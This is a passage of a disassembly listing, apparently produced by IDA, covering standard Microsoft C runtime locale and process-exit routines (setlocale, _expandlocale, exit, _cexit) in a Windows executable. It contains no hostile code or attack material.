		lea	eax, [esi+40h]
		cmp	[eax], cl
		jz	short loc_1006933
		push	eax
		push	offset a_	; "_"
		push	2
		push	[ebp+arg_0]
		call	__strcats
		add	esp, 10h

loc_1006933:				; CODE XREF: ___lc_lctostr+1Fj
		lea	eax, [esi+80h]
		cmp	byte ptr [eax],	0
		pop	esi
		jz	short loc_1006952
		push	eax
		push	offset a__0	; "."
		push	2
		push	[ebp+arg_0]
		call	__strcats
		add	esp, 10h

loc_1006952:				; CODE XREF: ___lc_lctostr+3Ej
		pop	ebp
		retn
___lc_lctostr	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_1006959	proc near		; CODE XREF: _setlocale+22Cp
					; _setlocale:loc_10070DEp

var_8		= dword	ptr -8
var_4		= dword	ptr -4

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	ecx
		push	ecx
		mov	eax, Memory
		test	eax, eax
		mov	[ebp+var_4], 1
		jnz	short loc_1006986
		push	351h		; Size
		call	_malloc
		test	eax, eax
		pop	ecx
		mov	Memory,	eax
		jnz	short loc_1006986
		leave
		retn
; ---------------------------------------------------------------------------

loc_1006986:				; CODE XREF: sub_1006959+15j
					; sub_1006959+29j
		push	ebx
		push	esi
		push	edi
		mov	byte ptr [eax],	0
		push	off_100E1E8
		push	offset asc_1001FE0 ; "="
		push	off_100E1E4
		push	3
		push	Memory
		call	__strcats
		mov	ebx, offset off_100E1E8
		add	esp, 14h
		mov	eax, ebx
		jmp	short loc_10069B9
; ---------------------------------------------------------------------------

loc_10069B6:				; CODE XREF: sub_1006959+D1j
		mov	eax, [ebp+var_8]

loc_10069B9:				; CODE XREF: sub_1006959+5Bj
		mov	edi, Memory
		dec	edi

loc_10069C0:				; CODE XREF: sub_1006959+6Dj
		mov	cl, [edi+1]
		inc	edi
		test	cl, cl
		jnz	short loc_10069C0
		mov	esi, offset asc_1001FDC	; ";"
		movsw
		mov	eax, [eax]
		lea	edi, [ebx+0Ch]
		mov	esi, [edi]

loc_10069D6:				; CODE XREF: sub_1006959+99j
		mov	dl, [eax]
		mov	cl, dl
		cmp	dl, [esi]
		jnz	short loc_10069F8
		test	cl, cl
		jz	short loc_10069F4
		mov	dl, [eax+1]
		mov	cl, dl
		cmp	dl, [esi+1]
		jnz	short loc_10069F8
		inc	eax
		inc	eax
		inc	esi
		inc	esi
		test	cl, cl
		jnz	short loc_10069D6

loc_10069F4:				; CODE XREF: sub_1006959+87j
		xor	eax, eax
		jmp	short loc_10069FD
; ---------------------------------------------------------------------------

loc_10069F8:				; CODE XREF: sub_1006959+83j
					; sub_1006959+91j
		sbb	eax, eax
		sbb	eax, 0FFFFFFFFh

loc_10069FD:				; CODE XREF: sub_1006959+9Dj
		test	eax, eax
		jz	short loc_1006A05
		and	[ebp+var_4], 0

loc_1006A05:				; CODE XREF: sub_1006959+A6j
		mov	ebx, edi
		push	dword ptr [ebx]
		mov	[ebp+var_8], ebx
		push	offset asc_1001FE0 ; "="
		push	dword ptr [ebx-4]
		push	3
		push	Memory
		call	__strcats
		add	esp, 14h
		cmp	ebx, offset off_100E218
		jl	short loc_10069B6
		cmp	[ebp+var_4], 0
		pop	edi
		pop	esi
		pop	ebx
		jnz	short loc_1006A3C
		mov	eax, Memory
		leave
		retn
; ---------------------------------------------------------------------------

loc_1006A3C:				; CODE XREF: sub_1006959+DAj
		push	Memory		; Memory
		call	_free
		and	Memory,	0
		mov	eax, off_100E1F4
		pop	ecx
		leave
		retn
sub_1006959	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl _expandlocale(char *Str, int, int, int)
__expandlocale	proc near		; CODE XREF: sub_1006C05+31p
					; _setlocale+195p

var_A0		= dword	ptr -0A0h
var_9C		= dword	ptr -9Ch
var_98		= dword	ptr -98h
Value		= dword	ptr -94h
var_4		= dword	ptr -4
Str		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 0A0h
		mov	eax, ___security_cookie
		mov	edx, [ebp+arg_8]
		mov	ecx, [ebp+arg_C]
		push	esi
		push	edi
		mov	edi, [ebp+Str]
		mov	[ebp+var_4], eax
		mov	eax, [ebp+arg_4]
		xor	esi, esi
		cmp	edi, esi
		mov	[ebp+var_A0], eax
		mov	[ebp+var_98], edx
		mov	[ebp+var_9C], ecx
		jnz	short loc_1006A9B
		xor	eax, eax
		jmp	loc_1006BF4
; ---------------------------------------------------------------------------

loc_1006A9B:				; CODE XREF: __expandlocale+37j
		cmp	byte ptr [edi],	43h
		jnz	short loc_1006ACB
		cmp	byte ptr [edi+1], 0
		jnz	short loc_1006ACB
		cmp	edx, esi
		mov	byte ptr [eax],	43h
		mov	byte ptr [eax+1], 0
		jz	short loc_1006ABC
		mov	[edx], si
		mov	[edx+2], si
		mov	[edx+4], si

loc_1006ABC:				; CODE XREF: __expandlocale+54j
		cmp	ecx, esi
		jz	loc_1006BF4
		mov	[ecx], esi
		jmp	loc_1006BF4
; ---------------------------------------------------------------------------

loc_1006ACB:				; CODE XREF: __expandlocale+43j
					; __expandlocale+49j
		mov	esi, edi
		mov	eax, offset byte_100E150
		push	ebx

loc_1006AD3:				; CODE XREF: __expandlocale+94j
		mov	bl, [eax]
		mov	cl, bl
		cmp	bl, [esi]
		jnz	short loc_1006AF5
		test	cl, cl
		jz	short loc_1006AF1
		mov	bl, [eax+1]
		mov	cl, bl
		cmp	bl, [esi+1]
		jnz	short loc_1006AF5
		inc	eax
		inc	eax
		inc	esi
		inc	esi
		test	cl, cl
		jnz	short loc_1006AD3

loc_1006AF1:				; CODE XREF: __expandlocale+82j
		xor	eax, eax
		jmp	short loc_1006AFA
; ---------------------------------------------------------------------------

loc_1006AF5:				; CODE XREF: __expandlocale+7Ej
					; __expandlocale+8Cj
		sbb	eax, eax
		sbb	eax, 0FFFFFFFFh

loc_1006AFA:				; CODE XREF: __expandlocale+98j
		test	eax, eax
		jz	loc_1006BB8
		mov	ebx, offset byte_100E0C8
		mov	esi, edi
		mov	eax, ebx

loc_1006B0B:				; CODE XREF: __expandlocale+CCj
		mov	dl, [eax]
		mov	cl, dl
		cmp	dl, [esi]
		jnz	short loc_1006B2D
		test	cl, cl
		jz	short loc_1006B29
		mov	dl, [eax+1]
		mov	cl, dl
		cmp	dl, [esi+1]
		jnz	short loc_1006B2D
		inc	eax
		inc	eax
		inc	esi
		inc	esi
		test	cl, cl
		jnz	short loc_1006B0B

loc_1006B29:				; CODE XREF: __expandlocale+BAj
		xor	eax, eax
		jmp	short loc_1006B32
; ---------------------------------------------------------------------------

loc_1006B2D:				; CODE XREF: __expandlocale+B6j
					; __expandlocale+C4j
		sbb	eax, eax
		sbb	eax, 0FFFFFFFFh

loc_1006B32:				; CODE XREF: __expandlocale+D0j
		test	eax, eax
		jz	short loc_1006BB2
		lea	eax, [ebp+Value]
		push	edi		; Str
		push	eax		; int
		call	___lc_strtolc
		test	eax, eax
		pop	ecx
		pop	ecx
		jz	short loc_1006B50

loc_1006B49:				; CODE XREF: __expandlocale+10Cj
		xor	eax, eax
		jmp	loc_1006BF3
; ---------------------------------------------------------------------------

loc_1006B50:				; CODE XREF: __expandlocale+ECj
		lea	eax, [ebp+Value]
		push	eax		; int
		push	offset dword_1010580 ; int
		push	eax		; Value
		call	___get_qualified_locale
		add	esp, 0Ch
		test	eax, eax
		jz	short loc_1006B49
		movzx	eax, word_1010584
		mov	dword_1010588, eax
		lea	eax, [ebp+Value]
		push	eax
		push	offset byte_100E150
		call	___lc_lctostr
		cmp	byte ptr [edi],	0
		pop	ecx
		pop	ecx
		jz	short loc_1006B9F
		mov	edx, ebx
		mov	eax, edi
		sub	edx, edi

loc_1006B93:				; CODE XREF: __expandlocale+140j
		mov	cl, [eax]
		mov	[edx+eax], cl
		inc	eax
		test	cl, cl
		jnz	short loc_1006B93
		jmp	short loc_1006BB2
; ---------------------------------------------------------------------------

loc_1006B9F:				; CODE XREF: __expandlocale+130j
		xor	eax, eax

loc_1006BA1:				; CODE XREF: __expandlocale+155j
		mov	cl, byte_100E150[eax]
		mov	byte_100E0C8[eax], cl
		inc	eax
		test	cl, cl
		jnz	short loc_1006BA1

loc_1006BB2:				; CODE XREF: __expandlocale+D9j
					; __expandlocale+142j
		mov	edx, [ebp+var_98]

loc_1006BB8:				; CODE XREF: __expandlocale+A1j
		test	edx, edx
		jz	short loc_1006BC6
		mov	esi, offset dword_1010580
		mov	edi, edx
		movsd
		movsw

loc_1006BC6:				; CODE XREF: __expandlocale+15Fj
		mov	eax, [ebp+var_9C]
		test	eax, eax
		jz	short loc_1006BD8
		mov	ecx, dword_1010588
		mov	[eax], ecx

loc_1006BD8:				; CODE XREF: __expandlocale+173j
		mov	edx, [ebp+var_A0]
		mov	eax, offset byte_100E150
		mov	esi, eax
		sub	edx, esi

loc_1006BE7:				; CODE XREF: __expandlocale+194j
		mov	cl, [eax]
		mov	[edx+eax], cl
		inc	eax
		test	cl, cl
		jnz	short loc_1006BE7
		mov	eax, esi

loc_1006BF3:				; CODE XREF: __expandlocale+F0j
		pop	ebx

loc_1006BF4:				; CODE XREF: __expandlocale+3Bj
					; __expandlocale+63j ...
		mov	ecx, [ebp+var_4]
		pop	edi
		pop	esi
		call	@__security_check_cookie@4 ; __security_check_cookie(x)
		leave
		retn
__expandlocale	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_1006C05(int, char *Str)
sub_1006C05	proc near		; CODE XREF: _setlocale+39p
					; _setlocale+150p ...

var_1A8		= dword	ptr -1A8h
var_1A4		= dword	ptr -1A4h
var_1A0		= dword	ptr -1A0h
var_19C		= dword	ptr -19Ch
CodePage	= dword	ptr -198h
Memory		= dword	ptr -194h
var_190		= dword	ptr -190h
CharType	= word ptr -188h
var_88		= dword	ptr -88h
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
Str		= dword	ptr  0Ch

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 1A8h
		mov	eax, ___security_cookie
		push	esi
		mov	esi, [ebp+arg_0]
		push	esi
		lea	ecx, [ebp+CodePage]
		push	ecx		; int
		lea	ecx, [ebp+var_190]
		push	ecx		; int
		lea	ecx, [ebp+var_88]
		mov	[ebp+var_4], eax
		mov	eax, [ebp+Str]
		push	ecx		; int
		push	eax		; Str
		call	__expandlocale
		add	esp, 14h
		test	eax, eax
		jz	loc_1006E7C
		push	ebx
		lea	ebx, [esi+esi*2]
		shl	ebx, 2
		mov	ecx, Memory[ebx]
		push	edi
		mov	[ebp+Memory], ecx
		lea	edi, [ebp+var_88]

loc_1006C60:				; CODE XREF: sub_1006C05+77j
		mov	dl, [edi]
		mov	al, dl
		cmp	dl, [ecx]
		jnz	short loc_1006C82
		test	al, al
		jz	short loc_1006C7E
		mov	dl, [edi+1]
		mov	al, dl
		cmp	dl, [ecx+1]
		jnz	short loc_1006C82
		inc	edi
		inc	edi
		inc	ecx
		inc	ecx
		test	al, al
		jnz	short loc_1006C60

loc_1006C7E:				; CODE XREF: sub_1006C05+65j
		xor	eax, eax
		jmp	short loc_1006C87
; ---------------------------------------------------------------------------

loc_1006C82:				; CODE XREF: sub_1006C05+61j
					; sub_1006C05+6Fj
		sbb	eax, eax
		sbb	eax, 0FFFFFFFFh

loc_1006C87:				; CODE XREF: sub_1006C05+7Bj
		test	eax, eax
		jnz	short loc_1006C96
		mov	eax, [ebp+Memory]
		jmp	loc_1006E7A
; ---------------------------------------------------------------------------

loc_1006C96:				; CODE XREF: sub_1006C05+84j
		lea	eax, [ebp+var_88]
		lea	edx, [eax+1]

loc_1006C9F:				; CODE XREF: sub_1006C05+9Fj
		mov	cl, [eax]
		inc	eax
		test	cl, cl
		jnz	short loc_1006C9F
		sub	eax, edx
		inc	eax
		push	eax		; Size
		call	_malloc
		test	eax, eax
		pop	ecx
		mov	[ebp+Memory], eax
		jz	loc_1006E58
		mov	ecx, Memory[ebx]
		mov	[ebp+var_19C], ecx
		lea	edi, ds:10106F4h[esi*4]
		mov	ecx, [edi]
		mov	[ebp+var_1A0], ecx
		mov	ecx, ___lc_codepage
		mov	[ebp+var_1A8], ecx
		lea	ecx, [ebp+var_88]
		mov	edx, ecx
		mov	[ebp+var_1A4], edi
		sub	eax, edx

loc_1006CF5:				; CODE XREF: sub_1006C05+F8j
		mov	dl, [ecx]
		mov	[eax+ecx], dl
		inc	ecx
		test	dl, dl
		jnz	short loc_1006CF5
		cmp	[ebp+arg_0], 2
		mov	eax, [ebp+Memory]
		mov	Memory[ebx], eax
		movzx	eax, word ptr [ebp+var_190]
		mov	[edi], eax
		lea	edi, [esi+esi*2]
		lea	edi, ds:1010748h[edi*2]
		lea	esi, [ebp+var_190]
		movsd
		movsw
		jnz	loc_1006E0C
		mov	eax, [ebp+CodePage]
		mov	ecx, dword_100E0BC
		mov	edx, dword_100E0C0
		and	[ebp+var_190], 0
		mov	___lc_codepage,	eax
		mov	eax, offset dword_100E09C

loc_1006D54:				; CODE XREF: sub_1006C05+175j
		mov	esi, [ebp+CodePage]
		cmp	esi, [eax]
		jz	short loc_1006D7E
		mov	esi, [eax]
		mov	edi, [eax+4]
		inc	[ebp+var_190]
		mov	[eax], ecx
		mov	[eax+4], edx
		add	eax, 8
		cmp	eax, offset dword_100E0C4
		mov	ecx, esi
		mov	edx, edi
		jl	short loc_1006D54
		jmp	short loc_1006DA1
; ---------------------------------------------------------------------------

loc_1006D7E:				; CODE XREF: sub_1006C05+157j
		mov	eax, [ebp+var_190]
		lea	eax, ds:100E09Ch[eax*8]
		mov	esi, [eax]
		mov	dword_100E09C, esi
		mov	esi, [eax+4]
		mov	dword_100E0A0, esi
		mov	[eax], ecx
		mov	[eax+4], edx

loc_1006DA1:				; CODE XREF: sub_1006C05+177j
		cmp	[ebp+var_190], 5
		jnz	short loc_1006E02
		push	1		; int
		push	dword_10106FC	; Locale
		lea	eax, [ebp+CharType]
		push	[ebp+CodePage]	; CodePage
		push	eax		; lpCharType
		push	7Fh		; cchSrc
		push	offset MultiByteStr ; lpMultiByteStr
		push	1		; dwInfoType
		call	___crtGetStringTypeA
		add	esp, 1Ch
		test	eax, eax
		jz	short loc_1006DF1
		push	7Fh
		xor	eax, eax
		pop	ecx
		mov	edi, offset aHH	; "	   h((((		  H"
		lea	esi, [ebp+CharType]
		repe cmpsw
		setz	al
		mov	dword_100E0A0, eax
		jmp	short loc_1006DF8
; ---------------------------------------------------------------------------

loc_1006DF1:				; CODE XREF: sub_1006C05+1CDj
		and	dword_100E0A0, 0

loc_1006DF8:				; CODE XREF: sub_1006C05+1EAj
		mov	eax, ___lc_codepage
		mov	dword_100E09C, eax

loc_1006E02:				; CODE XREF: sub_1006C05+1A3j
		mov	eax, dword_100E0A0
		mov	___lc_clike, eax

loc_1006E0C:				; CODE XREF: sub_1006C05+126j
		cmp	[ebp+arg_0], 1
		jnz	short loc_1006E1D
		mov	eax, [ebp+CodePage]
		mov	___lc_collate_cp, eax

loc_1006E1D:				; CODE XREF: sub_1006C05+20Bj
		call	off_100E1E0[ebx]
		test	eax, eax
		jz	short loc_1006E5C
		mov	eax, [ebp+var_19C]
		push	[ebp+Memory]	; Memory
		mov	Memory[ebx], eax
		call	_free
		mov	eax, [ebp+var_1A0]
		pop	ecx
		mov	ecx, [ebp+var_1A4]
		mov	[ecx], eax
		mov	eax, [ebp+var_1A8]
		mov	___lc_codepage,	eax

loc_1006E58:				; CODE XREF: sub_1006C05+B3j
		xor	eax, eax
		jmp	short loc_1006E7A
; ---------------------------------------------------------------------------

loc_1006E5C:				; CODE XREF: sub_1006C05+220j
		cmp	[ebp+var_19C], offset dword_100E098
		jz	short loc_1006E74
		push	[ebp+var_19C]	; Memory
		call	_free
		pop	ecx

loc_1006E74:				; CODE XREF: sub_1006C05+261j
		mov	eax, Memory[ebx]

loc_1006E7A:				; CODE XREF: sub_1006C05+8Cj
					; sub_1006C05+255j
		pop	edi
		pop	ebx

loc_1006E7C:				; CODE XREF: sub_1006C05+3Bj
		mov	ecx, [ebp+var_4]
		pop	esi
		call	@__security_check_cookie@4 ; __security_check_cookie(x)
		leave
		retn
sub_1006C05	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; char *__cdecl	setlocale(int, const char *)
_setlocale	proc near		; CODE XREF: WinMain(x,x,x,x)+18p

var_94		= dword	ptr -94h
var_90		= dword	ptr -90h
var_8C		= dword	ptr -8Ch
Dest		= byte ptr -88h
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
Str		= dword	ptr  0Ch

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 94h
		mov	eax, ___security_cookie
		mov	ecx, [ebp+arg_0]
		push	ebx
		xor	ebx, ebx
		cmp	ecx, ebx
		push	esi
		mov	[ebp+var_4], eax
		mov	eax, [ebp+Str]
		push	edi
		jl	loc_10070E9
		cmp	ecx, 5
		jg	loc_10070E9
		cmp	ecx, ebx
		jz	short loc_1006EE0
		cmp	eax, ebx
		jz	short loc_1006ED1
		push	eax		; Str
		push	ecx		; int
		call	sub_1006C05
		pop	ecx
		pop	ecx
		jmp	loc_10070E3
; ---------------------------------------------------------------------------

loc_1006ED1:				; CODE XREF: _setlocale+35j
		lea	eax, [ecx+ecx*2]
		mov	esi, Memory[eax*4]
		jmp	loc_10070E5
; ---------------------------------------------------------------------------

loc_1006EE0:				; CODE XREF: _setlocale+31j
		cmp	eax, ebx
		mov	[ebp+var_94], 1
		mov	[ebp+var_8C], ebx
		jz	loc_10070DE
		cmp	byte ptr [eax],	4Ch
		jnz	loc_1007016
		cmp	byte ptr [eax+1], 43h
		jnz	loc_1007016
		cmp	byte ptr [eax+2], 5Fh
		jnz	loc_1007016
		mov	esi, eax

loc_1006F17:				; CODE XREF: _setlocale+171j
		push	offset asc_1001FE4 ; "=;"
		push	esi		; Str
		call	_strpbrk
		mov	edi, eax
		cmp	edi, ebx
		pop	ecx
		pop	ecx
		jz	loc_10070E9
		sub	eax, esi
		mov	[ebp+var_94], eax
		jz	loc_10070E9
		cmp	byte ptr [edi],	3Bh
		jz	loc_10070E9
		mov	[ebp+var_90], 1
		mov	ebx, offset off_100E1E4
		jmp	short loc_1006F5C
; ---------------------------------------------------------------------------

loc_1006F56:				; CODE XREF: _setlocale+105j
		mov	eax, [ebp+var_94]

loc_1006F5C:				; CODE XREF: _setlocale+C8j
		push	eax		; MaxCount
		push	esi		; Str2
		push	dword ptr [ebx]	; Str1
		call	_strncmp
		add	esp, 0Ch
		test	eax, eax
		jnz	short loc_1006F82
		mov	eax, [ebx]
		lea	edx, [eax+1]

loc_1006F71:				; CODE XREF: _setlocale+EAj
		mov	cl, [eax]
		inc	eax
		test	cl, cl
		jnz	short loc_1006F71
		sub	eax, edx
		cmp	[ebp+var_94], eax
		jz	short loc_1006F93

loc_1006F82:				; CODE XREF: _setlocale+DEj
		inc	[ebp+var_90]
		add	ebx, 0Ch
		cmp	ebx, offset off_100E214
		jle	short loc_1006F56

loc_1006F93:				; CODE XREF: _setlocale+F4j
		inc	edi
		push	offset asc_1001FDC ; ";"
		push	edi		; Str
		call	_strcspn
		mov	esi, eax
		test	esi, esi
		pop	ecx
		pop	ecx
		jnz	short loc_1006FB0
		cmp	byte ptr [edi],	3Bh
		jnz	loc_10070E9

loc_1006FB0:				; CODE XREF: _setlocale+119j
		cmp	[ebp+var_90], 5
		jg	short loc_1006FEE
		push	esi		; Count
		lea	eax, [ebp+Dest]
		push	edi		; Source
		push	eax		; Dest
		call	_strncpy
		lea	eax, [ebp+Dest]
		push	eax		; Str
		push	[ebp+var_90]	; int
		mov	[ebp+esi+Dest],	0
		call	sub_1006C05
		add	esp, 14h
		test	eax, eax
		jz	short loc_1006FEE
		inc	[ebp+var_8C]

loc_1006FEE:				; CODE XREF: _setlocale+12Bj
					; _setlocale+15Aj
		add	esi, edi
		cmp	byte ptr [esi],	0
		jz	short loc_1007002
		inc	esi
		cmp	byte ptr [esi],	0
		jz	short loc_1007002
		xor	ebx, ebx
		jmp	loc_1006F17
; ---------------------------------------------------------------------------

loc_1007002:				; CODE XREF: _setlocale+167j
					; _setlocale+16Dj
		cmp	[ebp+var_8C], 0

loc_1007009:				; CODE XREF: _setlocale+24Dj
		jnz	loc_10070DE
		xor	esi, esi
		jmp	loc_10070E5
; ---------------------------------------------------------------------------

loc_1007016:				; CODE XREF: _setlocale+6Fj
					; _setlocale+79j ...
		push	ebx
		push	ebx		; int
		push	ebx		; int
		lea	ecx, [ebp+Dest]
		push	ecx		; int
		push	eax		; Str
		call	__expandlocale
		mov	esi, eax
		add	esp, 14h
		cmp	esi, ebx
		jz	loc_10070E5
		mov	[ebp+var_90], ebx
		mov	ebx, offset Memory
		mov	edi, ebx

loc_1007040:				; CODE XREF: _setlocale+220j
		cmp	edi, ebx
		jz	short loc_100709D
		mov	esi, [edi]
		lea	eax, [ebp+Dest]

loc_100704C:				; CODE XREF: _setlocale+1DCj
		mov	dl, [eax]
		mov	cl, dl
		cmp	dl, [esi]
		jnz	short loc_100706E
		test	cl, cl
		jz	short loc_100706A
		mov	dl, [eax+1]
		mov	cl, dl
		cmp	dl, [esi+1]
		jnz	short loc_100706E
		inc	eax
		inc	eax
		inc	esi
		inc	esi
		test	cl, cl
		jnz	short loc_100704C

loc_100706A:				; CODE XREF: _setlocale+1CAj
		xor	eax, eax
		jmp	short loc_1007073
; ---------------------------------------------------------------------------

loc_100706E:				; CODE XREF: _setlocale+1C6j
					; _setlocale+1D4j
		sbb	eax, eax
		sbb	eax, 0FFFFFFFFh

loc_1007073:				; CODE XREF: _setlocale+1E0j
		test	eax, eax
		jz	short loc_1007097
		lea	eax, [ebp+Dest]
		push	eax		; Str
		push	[ebp+var_90]	; int
		call	sub_1006C05
		test	eax, eax
		pop	ecx
		pop	ecx
		jnz	short loc_1007097
		and	[ebp+var_94], eax
		jmp	short loc_100709D
; ---------------------------------------------------------------------------

loc_1007097:				; CODE XREF: _setlocale+1E9j
					; _setlocale+201j
		inc	[ebp+var_8C]

loc_100709D:				; CODE XREF: _setlocale+1B6j
					; _setlocale+209j
		inc	[ebp+var_90]
		add	edi, 0Ch
		cmp	edi, offset off_100E218
		jle	short loc_1007040
		xor	edi, edi
		cmp	[ebp+var_94], edi
		jz	short loc_10070D3
		call	sub_1006959
		push	Memory		; Memory
		mov	esi, eax
		call	_free
		pop	ecx
		mov	Memory,	edi
		jmp	short loc_10070E5
; ---------------------------------------------------------------------------

loc_10070D3:				; CODE XREF: _setlocale+22Aj
		cmp	[ebp+var_8C], edi
		jmp	loc_1007009
; ---------------------------------------------------------------------------

loc_10070DE:				; CODE XREF: _setlocale+66j
					; _setlocale:loc_1007009j
		call	sub_1006959

loc_10070E3:				; CODE XREF: _setlocale+40j
		mov	esi, eax

loc_10070E5:				; CODE XREF: _setlocale+4Fj
					; _setlocale+185j ...
		mov	eax, esi
		jmp	short loc_10070EB
; ---------------------------------------------------------------------------

loc_10070E9:				; CODE XREF: _setlocale+20j
					; _setlocale+29j ...
		xor	eax, eax

loc_10070EB:				; CODE XREF: _setlocale+25Bj
		mov	ecx, [ebp+var_4]
		pop	edi
		pop	esi
		pop	ebx
		call	@__security_check_cookie@4 ; __security_check_cookie(x)
		leave
		retn
_setlocale	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: noreturn bp-based	frame

; int __cdecl __crtExitProcess(UINT uExitCode)
___crtExitProcess proc near		; CODE XREF: _WinMainCRTStartup+EFp
					; sub_10071A7+83p

uExitCode	= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	offset ModuleName ; "mscoree.dll"
		call	ds:__imp__GetModuleHandleA@4 ; GetModuleHandleA(x)
		test	eax, eax
		jz	short loc_1007126
		push	offset aCorexitprocess ; "CorExitProcess"
		push	eax		; hModule
		call	ds:__imp__GetProcAddress@8 ; GetProcAddress(x,x)
		test	eax, eax
		jz	short loc_1007126
		push	[ebp+uExitCode]
		call	eax

loc_1007126:				; CODE XREF: ___crtExitProcess+12j
					; ___crtExitProcess+22j
		push	[ebp+uExitCode]	; uExitCode
		call	ds:__imp__ExitProcess@4	; ExitProcess(x)
___crtExitProcess endp

; ---------------------------------------------------------------------------
		db 6 dup(0CCh)
; [0000001D BYTES: COLLAPSED FUNCTION __initterm. PRESS	KEYPAD "+" TO EXPAND]
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================


__cinit		proc near		; CODE XREF: _WinMainCRTStartup:loc_10065CEp
		mov	eax, __FPinit
		test	eax, eax
		jz	short loc_1007162
		call	eax ; __FPinit

loc_1007162:				; CODE XREF: __cinit+7j
		push	esi
		mov	ecx, offset ___xi_a
		mov	esi, offset ___xi_z
		xor	eax, eax
		cmp	ecx, esi
		push	edi
		mov	edi, ecx
		jnb	short loc_100718D

loc_1007176:				; CODE XREF: __cinit+30j
		test	eax, eax
		jnz	short loc_100719F
		mov	ecx, [edi]
		test	ecx, ecx
		jz	short loc_1007182
		call	ecx

loc_1007182:				; CODE XREF: __cinit+27j
		add	edi, 4
		cmp	edi, esi
		jb	short loc_1007176
		test	eax, eax
		jnz	short loc_100719F

loc_100718D:				; CODE XREF: __cinit+1Dj
		push	offset ___xc_z
		mov	eax, offset ___xc_a
		call	__initterm
		pop	ecx
		xor	eax, eax

loc_100719F:				; CODE XREF: __cinit+21j __cinit+34j
		pop	edi
		pop	esi
		retn
__cinit		endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_10071A7(UINT uExitCode, int)
sub_10071A7	proc near		; CODE XREF: _exit+Dp __exit+Dp ...

uExitCode	= dword	ptr  8
arg_4		= dword	ptr  0Ch

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	esi
		xor	esi, esi
		inc	esi
		cmp	__C_Exit_Done, esi
		jz	short loc_100721D
		cmp	[ebp+arg_4], 0
		mov	__C_Termination_Done, esi
		mov	__exitflag, bl
		jnz	short loc_100720D
		mov	ecx, ___onexitbegin
		test	ecx, ecx
		jz	short loc_10071FD
		mov	eax, ___onexitend
		sub	eax, 4
		cmp	eax, ecx
		jmp	short loc_10071F6
; ---------------------------------------------------------------------------

loc_10071E0:				; CODE XREF: sub_10071A7+54j
		mov	eax, [eax]
		test	eax, eax
		jz	short loc_10071E8
		call	eax

loc_10071E8:				; CODE XREF: sub_10071A7+3Dj
		mov	eax, ___onexitend
		sub	eax, 4
		cmp	eax, ___onexitbegin

loc_10071F6:				; CODE XREF: sub_10071A7+37j
		mov	___onexitend, eax
		jnb	short loc_10071E0

loc_10071FD:				; CODE XREF: sub_10071A7+2Bj
		push	offset ___xp_z
		mov	eax, offset ___xp_a
		call	__initterm
		pop	ecx

loc_100720D:				; CODE XREF: sub_10071A7+21j
		push	offset ___xt_z
		mov	eax, offset ___xt_a
		call	__initterm
		pop	ecx

loc_100721D:				; CODE XREF: sub_10071A7+Fj
		test	ebx, ebx
		jnz	short loc_100722F
		push	[ebp+uExitCode]	; uExitCode
		mov	__C_Exit_Done, esi
		call	___crtExitProcess
; ---------------------------------------------------------------------------

loc_100722F:				; CODE XREF: sub_10071A7+78j
		pop	esi
		pop	ebp
		retn
sub_10071A7	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: noreturn bp-based	frame

; void __cdecl exit(int	Code)
_exit		proc near		; CODE XREF: .text:01006622p

uExitCode	= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	ebx
		push	0		; int
		push	[ebp+uExitCode]	; uExitCode
		xor	ebx, ebx
		call	sub_10071A7
		pop	ecx
		pop	ecx
		pop	ebx
		pop	ebp
		retn
_exit		endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: noreturn bp-based	frame

; void __cdecl _exit(int Code)
__exit		proc near		; CODE XREF: __amsg_exit+20p
					; _WinMainCRTStartup+1C3p
					; DATA XREF: ...

uExitCode	= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	ebx
		push	1		; int
		push	[ebp+uExitCode]	; uExitCode
		xor	ebx, ebx
		call	sub_10071A7
		pop	ecx
		pop	ecx
		pop	ebx
		pop	ebp
		retn
__exit		endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================


; void __cdecl _cexit()
__cexit		proc near		; CODE XREF: .text:loc_1006627p
		mov	edi, edi
		push	ebx
		push	0		; int
		xor	ebx, ebx
		push	0		; uExitCode
		inc	ebx
		call	sub_10071A7
		pop	ecx
		pop	ecx
		pop	ebx
		retn
__cexit		endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================


; void __cdecl _c_exit()
__c_exit	proc near		; CODE XREF: _WinMainCRTStartup:loc_1006654p
		mov	edi, edi
		push	ebx
		xor	ebx, ebx
		inc	ebx
		push	ebx		; int
		push	0		; uExitCode
		call	sub_10071A7
		pop	ecx
		pop	ecx
		pop	ebx
		retn
__c_exit	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

__NMSG_WRITE	proc near		; CODE XREF: __amsg_exit+16p
